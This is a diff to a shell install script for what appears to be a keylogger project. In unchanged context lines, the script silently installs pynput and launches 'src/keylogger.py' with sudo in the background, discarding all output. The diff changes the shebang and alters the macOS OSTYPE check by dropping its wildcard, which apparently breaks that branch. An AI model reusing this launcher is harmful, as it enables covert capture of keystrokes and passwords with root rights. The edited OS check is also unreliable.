@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/usr/bin/env bash
 
 mypip=pip
 noop=">/dev/null 2>&1"
@@ -10,7 +10,7 @@ if [[ "$OSTYPE" == "linux-gnu" ]]; then
   pip3 install --upgrade pip >/dev/null 2>&1
   pip3 install pynput --user >/dev/null 2>&1
   sudo python3 src/keylogger.py >/dev/null 2>&1 &
-elif [[ "$OSTYPE" == "darwin"* ]]; then
+elif [[ "$OSTYPE" == "darwin" ]]; then
   echo "Mac Specific instructions"
   mypip=pip
   sudo xcodebuild -license accept >/dev/null 2>&1
@@ -27,5 +27,6 @@ else
 fi
 
 # TODO change to be more dynamic
+# psutil - 5.4.3
 # $mypip install pynput --user $noop
 # $mypip install numpy --user $noop
